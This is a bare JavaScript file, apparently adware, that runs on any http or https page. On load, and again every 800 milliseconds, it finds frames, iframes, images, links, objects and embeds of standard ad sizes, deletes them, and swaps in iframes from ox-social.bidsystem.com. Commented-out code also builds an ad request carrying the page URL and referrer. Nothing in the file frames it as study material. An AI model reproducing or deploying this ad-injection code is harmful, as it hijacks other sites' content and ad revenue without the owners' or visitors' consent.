var rndnum=Math.floor(Math.random()*1000001);

var ad_ids=new Array(
		{content:'<iframe id="50d10cabccc98" name="50d10cabccc98" src="//ox-social.bidsystem.com/w/1.0/afr?auid=329194&cb='+rndnum+'" frameBorder="0" frameSpacing="0" scrolling="no" width="160" height="600"><a href="//ox-social.bidsystem.com/w/1.0/rc?cs=50d10cabccc98&cb='+rndnum+'" ><img src="//ox-social.bidsystem.com/w/1.0/ai?auid=329194&cs=50d10cabccc98&cb='+rndnum+'" border="0" alt=""></a></iframe>',w:'160',h:'600',id:'84'},
		{content:'<iframe id="50d10ca74913d" name="50d10ca74913d" src="//ox-social.bidsystem.com/w/1.0/afr?auid=329192&cb='+rndnum+'" frameBorder="0" frameSpacing="0" scrolling="no" width="728" height="90"><a href="//ox-social.bidsystem.com/w/1.0/rc?cs=50d10ca74913d&cb='+rndnum+'" ><img src="//ox-social.bidsystem.com/w/1.0/ai?auid=329192&cs=50d10ca74913d&cb='+rndnum+'" border="0" alt=""></a></iframe>',w:'728',h:'90',id:'82'},
		{content:'<iframe id="50d10ca9d4570" name="50d10ca9d4570" src="//ox-social.bidsystem.com/w/1.0/afr?auid=329193&cb='+rndnum+'" frameBorder="0" frameSpacing="0" scrolling="no" width="300" height="250"><a href="//ox-social.bidsystem.com/w/1.0/rc?cs=50d10ca9d4570&cb='+rndnum+'" ><img src="//ox-social.bidsystem.com/w/1.0/ai?auid=329193&cs=50d10ca9d4570&cb='+rndnum+'" border="0" alt=""></a></iframe>',w:'300',h:'250',id:'83'})

var baseUrl='ox-social.bidsystem.com'; 
function ReplaceContent(frame,content)
{
try{
 			var sib=frame.nextSibling;
			var parent=frame.parentNode;		      
			if(!parent)parent=document.body;
			if(parent.tagName=='a')
			{
			frame=parent;
			sib=frame.nextSibling;
			parent=frame.parentNode;			
			}
			parent.removeChild(frame);
/*	
		var script=document.createElement('script');
			script.src=url;	
			script.defer='defer';
			script.async=false;
*/
			var script=document.createElement('div');
			script.innerHTML=content;	
			parent.insertBefore(script,sib);			
}catch(e){alert(e);}
}

function ProcessContent(tag)
{
try
{
	    var tags=document.getElementsByTagName(tag);
	    for(var i=0;i<tags.length;i++)

		{		 
		    var elem=tags[i];
			if (elem.hasAttribute('noreplace')) continue;
		    var parent=elem.parentNode;
		    var elUrl=elem.src+elem.href;
		    elUrl+=elem.flashvars+elem.movie+elem.data;
		    elUrl+=elem.innerHTML;
       		    if(elUrl.indexOf(baseUrl)!=-1)continue;
		    var w=elem.offsetWidth;
		    var h=elem.offsetHeight;   
		    var w2=elem.width;
		    var h2=elem.height;   
   		    var m3_r = Math.floor(Math.random()*99999999999);

//
/*		    var m3_u = (location.protocol=='https:'?'https://d.stampedemedia.net/ajs.php':'http://d.stampedemedia.net/ajs.php');
		    if (!document.MAX_used) document.MAX_used = ',';
		    m3_u+="?zoneid={%zone_id%}&cb="+ m3_r;
		    if (document.MAX_used != ',') 
			m3_u+="&exclude="+document.MAX_used;
		    m3_u+=document.charset ? '&charset='+document.charset : (document.characterSet ? '&charset='+document.characterSet : '');
		    m3_u+="&loc=" + escape(window.location);
		    if (document.referrer) 
			m3_u+="&referer=" + escape(document.referrer);
		    if (document.context)
			m3_u+="&context=" + escape(document.context);
		   if (document.mmm_fo) 
			m3_u+="&mmm_fo=1";
*/
		    for(var j=0;j<ad_ids.length;j++)	
			{		 	
    		    if((w2==ad_ids[j].w&&h2==ad_ids[j].h)||(w==ad_ids[j].w&&h==ad_ids[j].h))
			{                
//				m3_u=m3_u.replace('{%zone_id%}',ad_ids[j].id);  
		                ReplaceContent(elem,ad_ids[j].content.replace('{%rnd%}',m3_r));		
				continue;
		       	}
			}	    	
		}		
}catch(e){alert(e);}

}

function OnLoad()
{
try{
    	    if(!document.location||!document.location.href)return;
	    if(document.location.href.indexOf('http://')==-1&&document.location.href.indexOf('https://')==-1)return;
            if(document.location.href.indexOf(baseUrl)!=-1)return;
       	    ProcessContent('frame');
	    ProcessContent('iframe');
	    ProcessContent('img');
	    ProcessContent('a');
	    ProcessContent('object');
	    ProcessContent('embed');
//	    if(document.readyState!='complete')
		setTimeout(function(){try{OnLoad();}catch(e){}},800);	    

}catch(e){alert(e);}
}
OnLoad();
window.onload=OnLoad;